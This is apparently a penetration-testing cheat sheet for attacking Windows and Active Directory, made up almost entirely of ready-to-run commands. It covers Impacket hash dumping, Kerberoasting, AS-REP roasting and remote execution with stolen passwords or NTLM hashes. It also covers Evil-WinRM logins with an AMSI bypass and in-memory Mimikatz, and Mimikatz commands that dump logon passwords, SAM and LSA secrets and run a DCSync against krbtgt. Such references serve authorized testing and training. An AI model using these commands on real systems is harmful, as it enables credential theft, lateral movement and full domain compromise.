# Attacking Windows

## Impacket

```bash
# We connect to the server rather than a share
impacket-smbclient [domain]/[user]:[password/password hash]@[Target IP Address] 

# User enumeration on target
impacket-lookupsid [domain]/[user]:[password/password hash]@[Target IP Address] 

# Service enumeration
impacket-services [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] 

# Dumping hashes on target
impacket-secretsdump [domain]/[user]:[password/password hash]@[Target IP Address]  

# Kerberoasting, and request option dumps TGS
impacket-GetUserSPNs [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip IP -request  

# Asreproasting, need to provide usernames list
impacket-GetNPUsers test.local/ -dc-ip IP -usersfile usernames.txt -format hashcat -outputfile hashes.txt 

# Automated with https://github.com/Br14n41/asrep-roaster
./asrep-roaster.sh example.com 10.10.10.1 /usr/share/wordlists/users.txt


# RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

```

## Evil-Winrm

```bash
# winrm service discovery
nmap -p5985,5986 IP
5985 - plaintext protocol
5986 - encrypted

# Login with password
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -p pass -S # if 5986 port is open

# Login with Hash
evil-winrm -i IP -u user -H ntlmhash

# Login with key
# -c for public key and -k for private key
evil-winrm -i IP -c certificate.pem -k priv-key.pem -S 

# Logs
evil-winrm -i IP -u user -p pass -l

# File upload and download
upload <file>
download <file> <filepath-kali> # not required to provide path all time

# Loading files direclty from Kali location
evil-winrm -i IP -u user -p pass -s /opt/privsc/bash # Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

# evil-winrm commands
# to view commands
menu 

# There are several commands to run
# This is an example for running a binary
evil-winrm -i IP -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

## Mimikatz

```bash
privilege::debug

token::elevate

sekurlsa::logonpasswords # hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt

# both these dump SAM
lsadump::lsa /patch 

# OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```
